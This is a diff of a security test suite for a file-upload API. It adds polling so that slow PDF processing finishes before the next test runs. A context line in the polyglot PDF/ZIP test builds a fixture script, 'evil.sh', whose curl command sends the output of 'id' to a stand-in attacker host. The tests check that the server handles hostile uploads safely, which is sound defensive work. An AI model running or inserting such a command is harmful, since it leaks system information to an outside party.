@@ -628,6 +628,15 @@ class TestApiMaliciousPayload:
         )
         r = self._upload_raw(http, server, evil)
         _no_5xx(r); _no_stack_trace(r)
+        # Drain: wait for processing to finish before the next test starts.
+        # Without this, pdf-dispatch still renders this file at 300 DPI when
+        # the next upload arrives, causing 60-second timeouts downstream.
+        body = r.json()
+        if body.get("saved"):
+            try:
+                poll_task(http, server, body["saved"][0]["task_id"], timeout=30.0)
+            except TimeoutError:
+                pass  # Slow processing is acceptable; upload check already passed
 
     def test_polyglot_pdf_plus_zip(self, http, server):
         """File that is simultaneously PDF header + ZIP body."""
@@ -637,6 +646,15 @@ class TestApiMaliciousPayload:
             zf.writestr("evil.sh", "#!/bin/sh\ncurl http://attacker.example.com/$(id)")
         r = self._upload_raw(http, server, buf.getvalue())
         _no_5xx(r); _no_stack_trace(r)
+        # Drain: wait for processing to finish before the next test starts.
+        # Without this, pdf-dispatch still renders this file at 300 DPI when
+        # the next upload arrives, causing 60-second timeouts downstream.
+        body = r.json()
+        if body.get("saved"):
+            try:
+                poll_task(http, server, body["saved"][0]["task_id"], timeout=30.0)
+            except TimeoutError:
+                pass  # Slow processing is acceptable; upload check already passed
 
     def test_large_pdf_within_limit(self, http, server):
         """12 pages, well within MAX_PAGES=50. Must succeed."""
